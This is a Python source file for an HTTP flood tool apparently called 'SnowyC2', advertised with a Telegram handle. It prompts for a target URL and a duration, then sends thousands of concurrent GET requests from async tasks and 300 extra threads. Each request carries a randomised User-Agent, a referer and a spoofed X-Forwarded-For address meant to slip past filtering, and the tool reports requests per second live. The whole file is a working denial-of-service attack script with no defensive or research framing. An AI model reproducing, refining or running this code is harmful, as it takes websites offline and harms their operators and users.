import asyncio
import aiohttp
import random
import time
import threading
import sys
import os
import psutil
from concurrent.futures import ThreadPoolExecutor

MAX_CONCURRENT = 3000  # Core engine size (adjustable)
BOOSTER_THREADS = 300  # Request boosters (extra threads)
REQUEST_TIMEOUT = 10

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1)",
    "Mozilla/5.0 (Linux; Android 12; SM-G998U)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0"
]

def load_referers():
    try:
        with open("refs.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return ["https://www.google.com/"]

class SnowyC2:
    def __init__(self, method, target, duration):
        self.method = method
        self.target = target
        self.duration = duration
        self.referers = load_referers()
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0
        }
        self.start_time = 0
        self.process = psutil.Process(os.getpid())
        self.lock = threading.Lock()

    async def make_request(self, session):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(self.referers),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }
        try:
            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
                status = response.status
                with self.lock:
                    self.stats['total'] += 1
                    if status == 200:
                        self.stats['success'] += 1
                    else:
                        self.stats['errors'] += 1
        except:
            with self.lock:
                self.stats['total'] += 1
                self.stats['errors'] += 1

    async def batch_runner(self):
        conn = aiohttp.TCPConnector(limit_per_host=None)
        async with aiohttp.ClientSession(connector=conn) as session:
            while time.time() < self.start_time + self.duration:
                tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
                await asyncio.gather(*tasks)

    def booster(self):
        import requests
        session = requests.Session()
        while time.time() < self.start_time + self.duration:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Referer": random.choice(self.referers),
                    "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
                }
                r = session.get(self.target, headers=headers, timeout=5)
                with self.lock:
                    self.stats['total'] += 1
                    if r.status_code == 200:
                        self.stats['success'] += 1
                    else:
                        self.stats['errors'] += 1
            except:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['errors'] += 1

    def run_boosters(self):
        for _ in range(BOOSTER_THREADS):
            t = threading.Thread(target=self.booster)
            t.daemon = True
            t.start()

    def print_status_loop(self):
        while time.time() < self.start_time + self.duration:
            time.sleep(0.5)
            elapsed = time.time() - self.start_time
            remaining = max(0, self.duration - elapsed)
            rps = self.stats['total'] / elapsed if elapsed > 0 else 0
            self.stats['rps'] = rps
            self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)
            ram = self.process.memory_info().rss / 1024 / 1024

            sys.stdout.write("\033[H\033[J")
            print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
            print("=" * 60)
            print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
            print("=" * 60)
            print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
            print(f"RPS: {rps:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
            print(f"REMAINING: {remaining:.1f}s | RAM USED: {ram:.2f} MB")
            print("=" * 60)

    def start(self):
        self.start_time = time.time()

        # Print status in background
        threading.Thread(target=self.print_status_loop, daemon=True).start()

        # Start boosters
        self.run_boosters()

        # Start batch
        try:
            asyncio.run(self.batch_runner())
        except KeyboardInterrupt:
            print("Stopped.")
        except Exception as e:
            print(f"Error: {e}")

        # Final stats
        print("\nFINISHED")
        print("=" * 60)
        print(f"TOTAL: {self.stats['total']}")
        print(f"SUCCESS: {self.stats['success']}")
        print(f"ERRORS: {self.stats['errors']}")
        print(f"PEAK RPS: {self.stats['peak_rps']:.1f}")
        print("=" * 60)

def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 60)
    method = input("METHOD: ").strip()
    target = input("TARGET: ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    try:
        duration = int(input("TIME (seconds): ").strip())
    except:
        print("Invalid TIME")
        return

    bot = SnowyC2(method, target, duration)
    bot.start()

if __name__ == "__main__":
    main()
